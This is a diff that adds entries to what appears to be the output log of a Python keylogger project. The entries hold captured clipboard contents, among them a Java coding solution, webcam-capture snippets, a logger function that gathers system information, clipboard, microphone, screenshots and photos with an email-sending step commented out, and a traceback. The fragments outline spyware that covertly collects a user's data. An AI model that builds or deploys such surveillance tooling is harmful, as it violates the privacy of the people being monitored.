@@ -41,3 +41,59 @@ Traceback (most recent call last):
 TypeError: on_release() takes 0 positional arguments but 1 was given
 Clipboard Data: all the other logging fu
 nctions. hopefully test g
+Clipboard Data: public int timeRequiredToBuy(int[] tickets, int k) {
+        int ans =0;
+        for(int i=0;i<tickets.length;i++){
+            if(i<=k){
+                ans+=Math.min(tickets[i],tickets[k]);
+            }else{
+                ans+=Math.min(tickets[k]-1,tickets[i]);
+            }
+        }
+        return ans;
+    }
+Clipboard Data: from cv2 import *
+Clipboard Data: from cv2 import *
+Clipboard Data: open(attachments[x]
+Clipboard Data: s, img = cam.read()
+if s:    # frame captured without any errors
+    namedWindow("cam-test",CV_WINDOW_AUTOSIZE)
+    imshow("cam-test",img)
+    waitKey(0)
+    destroyWindow("cam-test")
+    imwrite("filename.jpg",img)
+Clipboard Data: s, img = cam.read()
+if s:    # frame captured without any errors
+    namedWindow("cam-test",CV_WINDOW_AUTOSIZE)
+    imshow("cam-test",img)
+    waitKey(0)
+    destroyWindow("cam-test")
+    imwrite("filename.jpg",img)
+Clipboard Data: Image Capture Failed
+Clipboard Data: Image Capture Failed
+Clipboard Data: def logger():
+    computer_information()
+    copy_clipboard()
+    microphone()
+    screenshot()
+    photo()
+    # send_email(toaddress)
+    
+Clipboard Data: def logger():
+    computer_information()
+    copy_clipboard()
+    microphone()
+    screenshot()
+    photo()
+    # send_email(toaddress)
+    
+Clipboard Data: File "/Users/rickyanashita/Developer/Python-Keylogger/logger.pyw", line 201, in <module>
+    listener.join()
+  File "/Library/Frameworks/Python.framework/Versions/3.11/lib/python3.11/site-packages/pynput/_util/__init__.py", line 269, in join
+    super(AbstractListener, self).join(*args)
+  File "/Library/Frameworks/Python.framework/Versions/3.11/lib/python3.11/threading.py", line 1112, in join
+    self._wait_for_tstate_lock()
+  File "/Library/Frameworks/Python.framework/Versions/3.11/lib/python3.11/threading.py", line 1132, in _wait_for_tstate_lock
+    if lock.acquire(block, timeout):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+KeyboardInterrupt
